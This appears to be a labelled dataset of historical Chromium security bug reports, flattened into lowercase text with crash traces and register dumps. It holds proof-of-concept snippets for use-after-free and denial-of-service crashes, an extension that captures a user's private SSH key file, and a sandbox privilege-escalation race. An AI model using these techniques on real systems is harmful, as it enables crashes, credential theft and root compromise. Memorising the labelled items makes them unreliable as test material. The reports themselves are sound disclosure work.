use after free in gpu gles2 shadertranslator reproduces on ubuntu box quite easily ending in tcmalloc threadcache freelist is never good put testcase in chromium\src\third_party\webkit\layouttests\fast\canvas\webgl directory in tcmalloc threadcache releasetocentralcache tcmalloc threadcache freelist unsigned long int dump of assembler code for function zn8tcmalloc11threadcache21releasetocentralcacheepns0_8freelistemi 0 push r15 2 movslq ecx r15 5 push r14 7 push r13 9 push r12 11 push rbp 12 mov rsi rbp 15 push rbx 16 sub rsp 20 mov rdi rsp 24 mov rsi eax 27 cmp rax r15 30 jbe zn8tcmalloc11threadcache21releasetocentralcacheepns0_8freelistemi+37 32 mov eax ecx 34 movslq eax r15 37 mov rip rax 44 mov rax rdx,8 rbx 52 mov rbx rsp 57 mov rax rdx,4 ebx 60 cmp ebx ecx 62 jle zn8tcmalloc11threadcache21releasetocentralcacheepns0_8freelistemi+301 68 lea rdx rdx,8 r13 72 mov ebx r14d 75 mov ecx r12d 78 neg r14d 81 sub ebx r12d 84 shl r13 88 add rip r13 95 nop 96 xor esi esi 98 xor edx edx 100 test ebx ebx 102 je zn8tcmalloc11threadcache21releasetocentralcacheepns0_8freelistemi+152 104 mov rbp rsi 108 cmp ebx 111 mov eax 116 mov rsi rdx 119 jle zn8tcmalloc11threadcache21releasetocentralcacheepns0_8freelistemi+138 121 nopl rax 128 add eax 131 mov rdx rdx 134 cmp ebx eax 136 jne zn8tcmalloc11threadcache21releasetocentralcacheepns0_8freelistemi+128 138 mov rdx rax 141 mov rax rbp 145 movq rdx 152 mov rbp eax 155 sub ebx eax 157 cmp rbp eax 160 mov eax rbp 163 jae zn8tcmalloc11threadcache21releasetocentralcacheepns0_8freelistemi+168 165 mov eax rbp 168 mov ebx ecx 170 mov r13 rdi 173 callq zn8tcmalloc15centralfreelist11insertrangeepvs1_i 178 mov r12d ecx 181 add r14d r12d 184 lea r12 rbx,1 eax 188 cmp eax ebx 190 jl zn8tcmalloc11threadcache21releasetocentralcacheepns0_8freelistemi+96 192 xor esi esi 194 xor edx edx 196 test ecx ecx 198 je zn8tcmalloc11threadcache21releasetocentralcacheepns0_8freelistemi+248 200 mov rbp rsi 204 cmp ecx 207 mov eax 212 mov rsi rdx 215 jle zn8tcmalloc11threadcache21releasetocentralcacheepns0_8freelistemi+234 217 nopl rax 224 add eax 227 mov rdx rdx 230 cmp ecx eax 232 jne zn8tcmalloc11threadcache21releasetocentralcacheepns0_8freelistemi+224 234 mov rdx rax 237 mov rax rbp 241 movq rdx 248 mov rbp eax 251 sub ecx eax 253 cmp rbp eax 256 mov eax rbp 259 jae zn8tcmalloc11threadcache21releasetocentralcacheepns0_8freelistemi+264 261 mov eax rbp 264 mov r13 rdi 267 callq zn8tcmalloc15centralfreelist11insertrangeepvs1_i 272 imul rsp r15 278 mov rsp rax 282 sub r15 rax 286 add rsp 290 pop rbx 291 pop rbp 292 pop r12 294 pop r13 296 pop r14 298 pop r15 300 retq 301 lea rdx rdx,8 r13 305 shl r13 309 add rip r13 316 jmp zn8tcmalloc11threadcache21releasetocentralcacheepns0_8freelistemi+192 end of assembler dump rax 2 rbx 32 rcx 2 rdx 4217907808 rsi 77058480 rdi 61729280 rbp rsp r8 4 r9 19930 r10 0 r11 518 r12 10 r13 58538304 r14 61729536 r15 2 rip tcmalloc threadcache releasetocentralcache tcmalloc threadcache freelist unsigned long int 234 eflags pf zf if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 0 in tcmalloc threadcache releasetocentralcache tcmalloc threadcache freelist unsigned long int 1 in tcmalloc threadcache scavenge 2 in tpoolallocator tpoolallocator 3 in tcompiler tcompiler 4 in translatorglsl translatorglsl 5 in gpu gles2 shadertranslator shadertranslator 6 in gpu gles2 gles2decoderimpl gles2decoderimpl 7 in gpu gpuprocessor destroycommon 8 in gpucommandbufferstub gpucommandbufferstub 9 in idmap gpucommandbufferstub idmapownershipsemantics 1 remove int 10 in gpuchannel oncontrolmessagereceived ipc message const 11 in gpuchannel onmessagereceived ipc message const 12 in ipc syncchannel onwaitableeventsignaled base waitableevent 13 in messageloop runtask task 14 in messageloop deferorrunpendingtask messageloop pendingtask const 15 in messageloop dowork 16 in base messagepumplibevent run base messagepump delegate 17 in messageloop runinternal 18 in messageloop run 19 in base thread threadmain 20 in base anonymous namespace threadfunc void 21 in start_thread arg value optimized out at pthread_create.c:300 22 in clone at sysdeps/unix/sysv/linux/x86_64/clone.s:112 23 in 0 in tcmalloc threadcache releasetocentralcache tcmalloc threadcache freelist unsigned long int	11
floats left out of the incremental line break code due to failed image load url-chunk-1 thread 0 crashed exc_bad_access kern_protection_failure google chrome framework renderobject.cpp:1925 webcore renderobject localtoabsolute google chrome framework layoutstate.cpp:117 webcore layoutstate layoutstate google chrome framework renderview.cpp:673 webcore renderview pushlayoutstate google chrome framework frameview.cpp:756 webcore frameview layout google chrome framework platform/timer.h:98 webcore timer webcore frameview fired google chrome framework threadtimers.cpp:112 webcore threadtimers sharedtimerfiredinternal google chrome framework threadtimers.cpp:90 webcore threadtimers sharedtimerfired google chrome framework message_loop.cc:410 messageloop runtask google chrome framework message_loop.cc:419 messageloop deferorrunpendingtask google chrome framework message_loop.cc:526 messageloop dowork google chrome framework message_pump_mac.mm:291 base messagepumpcfrunloopbase runworksource relatively popular on mac for 8.0.552.23 release perhaps because of the url in question also seems to happen on windows for this site	9
open popup in new tab using java applet vulnerability details it is possible to open a popup in new tab using java applet but it is not possible to open a popup on new window as with window.open version chrome version 8.0.552.224 stable 10.0.647.0 72276 dev operating system ubuntu 10.04 32 bit reproduction case 1 copy attached mmotion.html and pop.class to same folder 2 open mmotion.html in chrome this page contains pop.class applet 3 move the mouse over applet google.com will be loaded in new tab	2
race on a linked list in third_party/webkit/source/webcore/platform/sql/chromium/sqlitefilesystemchromiumposix.cpp i ve got the following race report while running chromium on cross_fuzz under threadsanitizer warning possible data race during write of size 8 at t14 l l799 0 releaselockinfo chromiumlockinfo third_party/webkit/source/webcore/platform/sql/chromium/sqlitefilesystemchromiumposix.cpp:157 1 chromiumclose sqlite3_file third_party/webkit/source/webcore/platform/sql/chromium/sqlitefilesystemchromiumposix.cpp:653 2 sqlite3osclose third_party/sqlite/src/src/os.c:58 3 sqlite3pagerclose third_party/sqlite/src/src/pager.c:2655 4 sqlite3btreeclose third_party/sqlite/src/src/btree.c:1982 5 sqlite3_close third_party/sqlite/src/src/main.c:634 6 webcore sqlitedatabase close third_party/webkit/source/webcore/platform/sql/sqlitedatabase.cpp:102 7 webcore abstractdatabase closedatabase third_party/webkit/source/webcore/storage/abstractdatabase.cpp:219 8 webcore database close third_party/webkit/source/webcore/storage/database.cpp:224 9 webcore databasethread databasethread third_party/webkit/source/webcore/storage/databasethread.cpp:124 10 wtf threadentrypoint void third_party/webkit/source/javascriptcore/wtf/threading.cpp:65 11 threadsanitizerstartthread home/kcc/drt/trunk/tsan/ts_valgrind_intercepts.c:650 concurrent write s happened at or after these points t15 l l862 0 releaselockinfo chromiumlockinfo third_party/webkit/source/webcore/platform/sql/chromium/sqlitefilesystemchromiumposix.cpp:157 1 chromiumclose sqlite3_file third_party/webkit/source/webcore/platform/sql/chromium/sqlitefilesystemchromiumposix.cpp:653 2 sqlite3osclose third_party/sqlite/src/src/os.c:58 3 sqlite3pagerclose third_party/sqlite/src/src/pager.c:2655 4 sqlite3btreeclose third_party/sqlite/src/src/btree.c:1982 5 sqlite3_close third_party/sqlite/src/src/main.c:634 6 webcore sqlitedatabase close third_party/webkit/source/webcore/platform/sql/sqlitedatabase.cpp:102 7 webcore abstractdatabase closedatabase third_party/webkit/source/webcore/storage/abstractdatabase.cpp:219 8 webcore database close third_party/webkit/source/webcore/storage/database.cpp:224 9 webcore databasethread databasethread third_party/webkit/source/webcore/storage/databasethread.cpp:124 10 wtf threadentrypoint void third_party/webkit/source/javascriptcore/wtf/threading.cpp:65 11 threadsanitizerstartthread home/kcc/drt/trunk/tsan/ts_valgrind_intercepts.c:650 location is 40 bytes inside a block starting at of size 56 allocated by t14 from heap 0 malloc home/kcc/drt/trunk/tsan/ts_valgrind_intercepts.c:410 1 sqlite3memmalloc third_party/sqlite/src/src/mem1.c:43 2 mallocwithalarm third_party/sqlite/src/src/malloc.c:251 3 sqlite3malloc third_party/sqlite/src/src/malloc.c:279 4 findlockinfo chromiumfile chromiumlockinfo chromiumopeninfo third_party/webkit/source/webcore/platform/sql/chromium/sqlitefilesystemchromiumposix.cpp:247 5 fillinchromiumfile sqlite3_vfs int int sqlite3_file char const int third_party/webkit/source/webcore/platform/sql/chromium/sqlitefilesystemchromiumposix.cpp:911 6 chromiumopen sqlite3_vfs char const sqlite3_file int int third_party/webkit/source/webcore/platform/sql/chromium/sqlitefilesystemchromiumposix.cpp:1020 7 sqlite3pageropen third_party/sqlite/src/src/pager.c:3236 8 sqlite3btreeopen third_party/sqlite/src/src/btree.c:1769 9 sqlite3btreefactory third_party/sqlite/src/src/main.c:1246 10 opendatabase third_party/sqlite/src/src/main.c:1643 11 webcore sqlitefilesystem opendatabase wtf string const sqlite3 bool third_party/webkit/source/webcore/platform/sql/chromium/sqlitefilesystemchromium.cpp:54 12 webcore sqlitedatabase open wtf string const bool third_party/webkit/source/webcore/platform/sql/sqlitedatabase.cpp:69 13 webcore abstractdatabase performopenandverify bool int third_party/webkit/source/webcore/storage/abstractdatabase.cpp:245 14 webcore database performopenandverify bool int third_party/webkit/source/webcore/storage/database.cpp:247 locks involved in this report reporting last lock sites l799 l862 l799 0 pthread_mutex_lock home/kcc/drt/trunk/tsan/ts_valgrind_intercepts.c:891 1 pthreadmutexenter third_party/sqlite/src/src/mutex_unix.c:222 2 sqlite3_close third_party/sqlite/src/src/main.c:596 3 webcore sqlitedatabase close third_party/webkit/source/webcore/platform/sql/sqlitedatabase.cpp:102 4 webcore abstractdatabase closedatabase third_party/webkit/source/webcore/storage/abstractdatabase.cpp:219 5 webcore database close third_party/webkit/source/webcore/storage/database.cpp:224 6 webcore databasethread databasethread third_party/webkit/source/webcore/storage/databasethread.cpp:124 7 wtf threadentrypoint void third_party/webkit/source/javascriptcore/wtf/threading.cpp:65 8 threadsanitizerstartthread home/kcc/drt/trunk/tsan/ts_valgrind_intercepts.c:650 l862 0 pthread_mutex_lock home/kcc/drt/trunk/tsan/ts_valgrind_intercepts.c:891 1 pthreadmutexenter third_party/sqlite/src/src/mutex_unix.c:222 2 sqlite3_close third_party/sqlite/src/src/main.c:596 3 webcore sqlitedatabase close third_party/webkit/source/webcore/platform/sql/sqlitedatabase.cpp:102 4 webcore abstractdatabase closedatabase third_party/webkit/source/webcore/storage/abstractdatabase.cpp:219 5 webcore database close third_party/webkit/source/webcore/storage/database.cpp:224 6 webcore databasethread databasethread third_party/webkit/source/webcore/storage/databasethread.cpp:124 7 wtf threadentrypoint void third_party/webkit/source/javascriptcore/wtf/threading.cpp:65 8 threadsanitizerstartthread home/kcc/drt/trunk/tsan/ts_valgrind_intercepts.c:650 race verifier data looks like a potential crasher we have at least four crash reports where this stack is present in non-crashing thread i ll be investigating further	11
gtk message dialogs do not properly wrap overly long words or elide many short lines in js modal dialog i ve found a way to reliably crash the latest version of chrome on a linux machine remotely by directing a user to a specially crafted website it is possible to freeze/crash chrome and lock up any currently open windows on the machine requiring a reboot of x the problem lies in how chrome generates new windows namely alert and prompt windows in other browsers long strings are simply truncated this is the case in the windows version of chrome it seems however if you generate a relatively long string and alert it the browser will crash this is not due to an issue with chrome per se as gtk does not handle windows that are relatively large however as chrome generates a very wide window outside the bounds of what gtk supports it is trivial to remotely dos and lockup x on a machine a poc website has been setup at the code is a simple concatenation of a on the order of 2^16 var x a for var d 1 d 16 d x x alert x this bug affects linux distributions with the latest version of x i have also tested this bug on windows 7 and os x neither of which appear to be affected	11
race in base/third_party/xdg_mime crasher vulnerability details opening suitable pages sometimes causes chrome to crash at various places on startup these kind of crashes have been happening for a while now but have been difficult to isolate and reproduce the last browser test run found several files which seem to trigger this fairly often one such file is attached i ll try to narrow down the cause later if others can also reproduce and this is not a duplicate issue the crashes look like there could be a memory corruption many of the traces have had hosed pointers often with freeing or allocating going on nearby so reporting this conservatively as a security issue version chrome version 9.0.597.83 beta also current dev operating system linux ubuntu 10.10 x64_64 reproduction case the crash should occur at least once a minute when repeatedly opening the attached file the following loop should trigger a browser crash about once a minute while true do google-chrome a.html a.html a.html a.html sleep 1.5 pkill 9 chrome done for crashes please include the following additional information type of crash browser crash state crash state varies a lot one from 9.0.597.83 beta program received signal sigsegv segmentation fault switching to thread lwp 24653 strcmp_sse2 at sysdeps/x86_64/multiarch strcmp.s:107 107 sysdeps/x86_64/multiarch strcmp.s no such file or directory in sysdeps/x86_64/multiarch strcmp.s gdb bt 0 strcmp_sse2 at sysdeps/x86_64/multiarch strcmp.s:107 1 in msort_with_tmp p value optimized out b value optimized out n value optimized out at msort.c:105 2 in msort_with_tmp p value optimized out b value optimized out n value optimized out at msort.c:54 3 in msort_with_tmp p value optimized out b value optimized out n value optimized out at msort.c:54 4 in msort_with_tmp p value optimized out b value optimized out n value optimized out at msort.c:54 5 in msort_with_tmp p b value optimized out n value optimized out at msort.c:53 6 in msort_with_tmp p b value optimized out n value optimized out at msort.c:53 7 in msort_with_tmp p b value optimized out n value optimized out at msort.c:53 8 in msort_with_tmp p b value optimized out n value optimized out at msort.c:53 9 in msort_with_tmp p b value optimized out n value optimized out at msort.c:53 10 in qsort_r b value optimized out n value optimized out s=0 cmp arg at msort.c:294 11 in 12 in gdb info registers rax 0 rbx 79351936 rcx 47 rdx 0 rsi 30681274979123311 rdi 79288896 rbp rsp r8 79300736 r9 79300928 r10 79300896 r11 518 r12 1 r13 79345680 r14 79345680 r15 16 rip strcmp_sse2+26 eflags cf sf if rf cs 51 ss 43 ds 0 es 0 fs 0 gs 0 gdb disas rip-32 rip+32 dump of assembler code from to strcmp+58 add al bl jmp strcmp_sse2 nop nop strcmp_sse2+0 mov esi ecx strcmp_sse2+2 mov edi eax strcmp_sse2+4 and rcx strcmp_sse2+8 and rax strcmp_sse2+12 cmp ecx strcmp_sse2+15 ja strcmp_sse2+80 strcmp_sse2+17 cmp eax strcmp_sse2+20 ja strcmp_sse2+80 strcmp_sse2+22 movlpd rdi xmm1 strcmp_sse2+26 movlpd rsi xmm2 strcmp_sse2+30 movhpd rdi xmm1 strcmp_sse2+35 movhpd rsi xmm2 strcmp_sse2+40 pxor xmm0 xmm0 strcmp_sse2+44 pcmpeqb xmm1 xmm0 strcmp_sse2+48 pcmpeqb xmm2 xmm1 strcmp_sse2+52 psubb xmm0 xmm1 strcmp_sse2+56 pmovmskb xmm1 edx end of assembler dump gdb p rsi 1 30681274979123311 the next one was program received signal sigsegv segmentation fault switching to thread lwp 26063 in gdb bt 0 in 1 in 2 in sqlite3_free from usr/lib/libsqlite3.so.0 3 in from usr/lib/libsqlite3.so.0 4 in from usr/lib/libsqlite3.so.0 5 in sqlite3_exec from usr/lib/libsqlite3.so.0 6 in tableexists sqldb tablename value optimized out at sdb.c:1657	9
chrome.tabs.capturevisibletab allows capturing images of any file resource vulnerability details the tabs permission for extensions allows an extension to capture an image of any text file directory or image from the user s computer via the capturevisibletab method version chrome version 9.0.597.94 stable operating system win7 ubuntu 10.10 reproduction case 1 download the attached extension 2 update the file variable in the popup.html file to point to a local text file on your computer pick something fun like your private key file 3 install the extension 4 open the extension s popup sorry no icon this all boils down to using the following chrome.tabs.create url file home user ssh/id_rsa chrome.tabs.capturevisibletab null function d do something evil with d	9
browser crash/segfault when selecting very long option in select vulnerability details the segfault address is constant per browser version for a given string changing the length of the string changes the segfault address version chromium 11.0.670.0 developer build 74745 ubuntu 10.10 linux x86_64 2.6.35-26-generic reproduction case attached the longer one on atleast one computer kills the browser too with error 20711:20711:240041724115 error browser_main_gtk.cc 39 x error detected serial 15690 error_code 11 badalloc insufficient resources for operation request_code 53 minor_code 0 x_createpixmap 20711:20711:240041724664 error browser_main_gtk.cc 39 x error detected serial 15692 error_code 9 baddrawable invalid pixmap or window parameter request_code 55 minor_code 0 x_creategc 20711:20711:240041724680 error browser_main_gtk.cc 39 x error detected serial 15693 error_code 13 badgc invalid gc parameter request_code 62 minor_code 0 x_copyarea 20711:20711:240041727828 error browser_main_gtk.cc 39 x error detected serial 15691 error_code 9 baddrawable invalid pixmap or window parameter request_code 153 minor_code 4 rendercreatepicture chromium-browser src/xcb_io.c:183 process_responses assertion req current_request long req sequence long current_request 0 failed zsh abort core dumped chromium-browser for crashes please include the following additional information type of crash tab sometimes browser crash state 244 mov rcx edx rcx 665860 0 skargb32_opaque_blitter blitmask this value optimized out mask clip value optimized out at third_party/skia/src/core/skblitter_argb32.cpp:273 1 in d1g_nobounder_rectclip state fx value optimized out fy value optimized out glyph value optimized out at third_party/skia/src/core/skdraw.cpp:1349 2 in skdraw drawpostext	9
floats not cleared to logical height wraps vulnerability details stale pointer rip goes to random address version google chrome 9.0.597.98 official build 74359 chromium 11.0.673.0 developer build 75059 ubuntu 10.10 on linux 2.6.35-27-generic 47-ubuntu smp fri feb 11 22:52:49 utc 2011 x86_64 google chrome 9.0.597.102 official build 74604 osx snow leopard 10.6.6 reproduction case attached for crashes please include the following additional information type of crash tab crash state 0 in 1 in webcore renderblock insertfloatingobject at third_party/webkit/source/webcore/rendering/renderblock.cpp:3073 2 in webcore renderblock layoutinlinechildren at third_party/webkit/source/webcore/rendering/renderblocklinelayout.cpp:870 195 callq rax	11
bypass sop with blob this template is only for reporting security bugs please use a different template for other types of bug reports please see the following link for instructions on filing security bugs vulnerability details please provide a brief explanation of the security issue version chrome version x.x.x.x stable beta or dev operating system please indicate os version and service pack level reproduction case please include a demonstration of the security bug such as an attached html or binary file that reproduces the bug when loaded in chrome please make the file as small as possible and remove any content not required to demonstrate the bug for crashes please include the following additional information type of crash tab browser etc crash state see link above stack trace registers exception record client id if relevant see link above	5
security domui process can be ptraced from a compromised renderer leading to sandbox escape i believe we should never sync extensions that can run native code it s obviously dangerous in a number of scenarios and it looks like it could allow escaping the sandbox in many cases for instance i have not verified this but it seems likely from inside the sandbox use google credentials to add a new malicious extension that can run native code to chrome sync chrome settings/personal runs inside the sandbox in chrome 10 it seems likely that an attacker could enable chrome sync from inside the sandbox you now run native code outside the sandbox bonus you also owned any machine from the same user with chrome sync enabled	9
webcore renderobjectchildlist destroyleftoverchildren use-after-free with nesting ruby tag and css propierties advisory title webcore renderobjectchildlist destroyleftoverchildren use-after-free with nesting ruby tag and css propierties os windows xp sp3 sec-severity probably high tested on safari 5.0.3 not affected and chrome 11.0.686.3 dev chrome 9.0.597.107 affected intro i have had problems watching the source code so i needed to find it directly from chromium page and download implicated files this is an issue that i have since you changed the symbol url sorry if this analysis is not enough detailed but it s due to previous raison also i ve got different logs using the original poc not reduced and this anyway i think that poc has been reduced correctly but i ve attached because maybe it hides another vuln or if you want to reproduce the original logs on the other hand other poc very similar to this produces a null ptr poc and stacktrace are also attached for this case then i ve included a meta tag for doing a refresh because it did n't crash automatically without it you needed to reload and it usually got crashed in second time in summary files poc_reduced.html log poc_reduced.html stable dev poc_fuzz.html stable channel log poc_fuzz.html stable dev channel log poc_fuzz.html dev poc_null_ptr.html log poc_null_ptr.html stable dev description there is a vulnerability due to nesting of ruby tags and using some css properties issue is a freed memory that it s used later an use-after-free vulnerability i ve got several crashes using two different pocs one attached original from fuzzer and another reduced which it s included in this advisory this analysis is made using the reduced poc the stacktrace shows warning frame ip not in any known module following frames may be wrong chrome_1c30000 webcore renderobjectchildlist destroyleftoverchildren chrome_1c30000 webcore renderblock destroy chrome_1c30000 webcore node detach chrome_1c30000 webcore containernode detach chrome_1c30000 webcore element detach chrome_1c30000 webcore containernode detach chrome_1c30000 webcore element detach chrome_1c30000 webcore containernode detach chrome_1c30000 webcore element detach chrome_1c30000 webcore containernode detach chrome_1c30000 webcore element detach chrome_1c30000 webcore containernode detach chrome_1c30000 webcore document detach document detach begins to detach the document calls to containernode detach 1 and it begins to detach each child repeating this process 2 and 3 and finally last css propierty 4 in this point goes to renderblock destroy 5 and finally it reaches the point 6 where pass to renderobjectchildlist destroyleftoverchildren in this point 7 it produces the use of a freed memory referenced functions void document detach renderobject render renderer setrenderer 0 m_hovernode 0 m_focusednode 0 m_activenode 0 containernode detach 1 unschedulestylerecalc if render render destroy void containernode detach for node child m_firstchild child child child nextsibling child detach 2 clearchildneedsstylerecalc node detach 4 void element detach renderwidget suspendwidgethierarchyupdates cancelfocusappearanceupdate if hasraredata raredata resetcomputedstyle containernode detach 3 renderwidget resumewidgethierarchyupdates void node detach if renderer renderer destroy 5 setrenderer 0 document doc document void renderblock destroy children destroyleftoverchildren 6 void renderobjectchildlist destroyleftoverchildren while firstchild 7 if firstchild islistmarker firstchild style styletype first_letter firstchild istext firstchild remove list markers are owned by their enclosing list and so do n't get destroyed by this container similarly first letters are destroyed by their remaining text fragment else if firstchild isrunin firstchild node firstchild node setrenderer 0 firstchild node setneedsstylerecalc firstchild destroy else destroy any anonymous children remaining in the render tree as well as implicit shadow dom elements like those used in the engine-based text fields if firstchild node firstchild node setrenderer 0 firstchild destroy poc this is the poc reduced i ve tried to change it deleting before or any css propierty and it seems the most simple sample as i ve said if you delete a ruby tag new poc crashes with a null ptr poc_reduced.html meta http-equiv refresh content 1 url style ruby before display table content url style ruby ruby ruby style ruby float right style ruby ruby ruby credits vulnerability discovered maybe not the first by jose a vazquez of	11
bad cast to renderblock with floating select element with required attribute chrome version copy from about version urls if applicable other browsers tested also tested chrome 10.x on mac and it failed what steps will reproduce the problem 1 go here 2 submit the form without first picking an option 3 submit again or pick an option what is the expected result i expect that the form will let me select an option and then validate correctly what happens instead chrome crashes please provide any additional information below another issue also exists with the validation not updating when using keyword to navigation you can repeat this by going here click submit then after chrome focues on the select use your arrow keys to select an option	9
stale pointer in webcore layerrendererchromium drawlayer vulnerability details when a video element with its position property set to fixed is appended to an arbitrary element with its visibility property set to collapse chromium will crash when the page is reloaded if this is done in a document included in a second document by an iframe the crash will occur due to a stale pointer in webcore layerrendererchromium drawlayer if an iframe is not used the crash will usually be caused by a null pointer dereference in the get function in third_party/webkit/source/javascriptcore/wtf/ownptr.h version chrome version chromium 10.0.648.127 ubuntu 10.10 stable operating system ubuntu 10.10 reproduction case crash.html html head title webcore layerrendererchromium drawlayer crash poc title head body onload boom script type text/javascript settimeout window.location.reload 100 function boom arbitrary document.createelement arbitrary arbitrary.style.visibility collapse document.body.appendchild arbitrary video document.createelement video video.setattribute src arbitrary video.style.position fixed arbitrary.appendchild video script body html outer.html not necessary but helps to demonstrate the security implications iframe src crash.html iframe for crashes please include the following additional information type of crash tab chromium-browser debug single-process outer.html env ld_library_path=/usr/lib/chromium-browser path=/usr/lib/chromium-browser usr/local/sbin usr/local/bin usr/sbin usr/bin sbin bin usr/games gtk_path chromium_user_flags chromium_flags usr/bin/gdb usr/lib/chromium-browser/chromium-browser x tmp/chromiumargs.iajjk1 gnu gdb gdb 7.2-ubuntu copyright c 2010 free software foundation inc license gplv3 gnu gpl version 3 or later this is free software you are free to change and redistribute it there is no warranty to the extent permitted by law type show copying and show warranty for details this gdb was configured as x86_64-linux-gnu for bug reporting instructions please see reading symbols from usr/lib/chromium-browser/chromium-browser reading symbols from data/debug/usr/lib/chromium-browser/chromium-browser done done gdb r program received signal sigsegv segmentation fault switching to thread lwp 19368 in gdb bt 0 in 1 in webcore layerrendererchromium drawlayer this layer targetsurface value optimized out at third_party/webkit/source/webcore/platform/graphics/chromium/layerrendererchromium.cpp:691 2 in webcore layerrendererchromium drawlayers this visiblerect value optimized out contentrect value optimized out scrollposition value optimized out tilepaint value optimized out scrollbarpaint value optimized out at third_party/webkit/source/webcore/platform/graphics/chromium/layerrendererchromium.cpp:315 3 in webkit webviewimpl docomposite this at third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:2399 4 in webkit webviewimpl composite this finish=96 at third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:1080 5 in renderwidget dodeferredupdate this at chrome/renderer/render_widget.cc:619 6 in renderwidget calldodeferredupdate this at chrome/renderer/render_widget.cc:528 7 in dispatch renderwidget renderwidget gdb frame 1 1 in webcore layerrendererchromium drawlayer this layer targetsurface value optimized out at third_party/webkit/source/webcore/platform/graphics/chromium/layerrendererchromium.cpp:691 691 third_party/webkit/source/webcore/platform/graphics/chromium/layerrendererchromium.cpp no such file or directory in third_party/webkit/source/webcore/platform/graphics/chromium/layerrendererchromium.cpp gdb disas dump of assembler code for function webcore layerrendererchromium drawlayer webcore layerchromium webcore rendersurfacechromium 124 mov rdx rsp 129 mov rax rsp 134 mov rdx rsp 139 callq webcore intrect intersects webcore intrect const const 144 test al al 146 je webcore layerrendererchromium drawlayer webcore layerchromium webcore rendersurfacechromium 47 148 cmpb rbx 155 je webcore layerrendererchromium drawlayer webcore layerchromium webcore rendersurfacechromium 192 157 mov rbx rax 160 mov rbx rdi 163 callq rax 166 test al al 168 jne webcore layerrendererchromium drawlayer webcore layerchromium webcore rendersurfacechromium 216 170 mov rbx rdi 173 callq webcore layerchromium drawdebugborder 178 jmpq webcore layerrendererchromium drawlayer webcore layerchromium webcore rendersurfacechromium 47 type return to continue or q return to quit q quit gdb i r rax 140737374414208 rbx 140737374413504 rcx 10 rdx 160 rsi 140736987570016 rdi 140737374413504 rbp rsp r8 160 r9 10 r10 10 r11 518 r12 140737374414080 r13 0 r14 0 r15 6 rip webcore layerrendererchromium drawlayer webcore layerchromium webcore rendersurfacechromium 166 eflags if rf cs 51 ss 43 ds 0 es 0 type return to continue or q return to quit fs 0 gs 0 gdb	9
linux setuid sandbox allows local privilege escalation vulnerability details on linux systems that have some form of automated cleanup of tmp via cronjob or daemon it appears to be possible to exploit the setuid chrome-sandbox application to escalate privileges to root version chrome version 9.0.597.107 official build 75357 operating system linux reproduction case by exploiting two race conditions in the chrome-sandbox it seems possible to cause arbitrary applications to be sandboxed in a directory whose contents are entirely controlled by the local user which can be easily be exploited to escalate privileges e.g by launching a setuid app that does n't expect to be in a chroot d environment first the sandbox creates a temporary directory const char temp_dir mkdtemp tempdirectorytemplate at this point the attacker must win the first race and send a sigstop to the process causing it to sleep the attacker then waits as long as necessary for the tmp directory to be cleaned up by something like tmpwatch at this point the attacker replaces the previous directory with a symlink to a directory he controls which has been set up ahead of time to contain hard links to whatever resources he wishes to exploit once the chroot is set up next the attacker s symlinked directory is opened const int chroot_dir_fd open temp_dir o_directory o_rdonly now the attacker must win the second race which involves replacing this symlink with a new empty directory so the following call to rmdir succeeds if rmdir temp_dir from this point forward the attacker is home free the attacker s directory is chown d to root root and chmod d 0000 which does n't matter because we ve already pre-populated the directory with whatever we want in it note that this can alternatively be used to wreak havoc on a system by chown'ing and chmod'ing arbitrary directories assuming the child process does the proper socket communication to negotiate setting up the chroot it seems like this would result in the child process being chroot d to the attacker s directory at which point a setuid process can be exec d and exploited in my testing it seems the chmod 0000 does nothing to prevent a process that is chroot d via proc/self/fd/x to access the new filesystem hierarchy it s definitely possible i ve missed something that would render this non-exploitable but it seems that at the very least it s possible to destroy a system by rendering important directories unreadable	11
oob read in fedisplacementmap apply 18 seems exploitable 19,20 seems only crash eax=007e7b40 ebx=007e7c80 ecx=007e7c80 edx=00000806 esi=001fecdc edi=007e7c80 eip=00000003 esp=001fec9c ebp=001fecb0 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 00000003 1:014 k childebp retaddr warning frame ip not in any known module following frames may be wrong 001fec98 652cd0ae 001fecb0 65522c61 chrome_64da0000 webcore node isdefaultnamespace d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\node.cpp 1734 001fecd0 65abec10 chrome_64da0000 webcore nodeinternal isdefaultnamespacecallback d b\build\slave\chrome-official\build\src\build\release\obj\global_intermediate\webcore\bindings\v8node.cpp 272 001fed34 65abef1f chrome_64da0000 v8 internal handleapicallhelper 0 d b\build\slave\chrome-official\build\src\v8\src\builtins.cc 1037 001fede0 65a977c2 chrome_64da0000 v8 internal builtin_handleapicall d b\build\slave\chrome-official\build\src\v8\src\builtins.cc 1054 001fee24 65a97896 chrome_64da0000 v8 internal invoke d b\build\slave\chrome-official\build\src\v8\src\execution.cc 96 001fee48 65a48318 chrome_64da0000 v8 internal execution call d b\build\slave\chrome-official\build\src\v8\src\execution.cc 121 001fee90 6539a52d chrome_64da0000 v8 function call d b\build\slave\chrome-official\build\src\v8\src\api.cc 2880 001feed8 65431874 chrome_64da0000 webcore v8proxy callfunction d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\bindings\v8\v8proxy.cpp 482 001fef08 6545bbe1 chrome_64da0000 webcore v8eventlistener calllistenerfunction d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\bindings\v8\custom\v8customeventlistener.cpp 75 001fef50 6545ba90 chrome_64da0000 webcore v8abstracteventlistener invokeeventhandler d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\bindings\v8\v8abstracteventlistener.cpp 151 001fef80 6539ed34 chrome_64da0000 webcore v8abstracteventlistener handleevent d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\bindings\v8\v8abstracteventlistener.cpp 95 001fefb0 6539ec6e chrome_64da0000 webcore eventtarget fireeventlisteners d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\eventtarget.cpp 342 001fefdc 652eb27e chrome_64da0000 webcore eventtarget fireeventlisteners d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\eventtarget.cpp 313 001ff004 652eb310 chrome_64da0000 webcore domwindow dispatchevent d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\page\domwindow.cpp 1551 001ff018 652eb0e2 chrome_64da0000 webcore domwindow dispatchtimedevent d 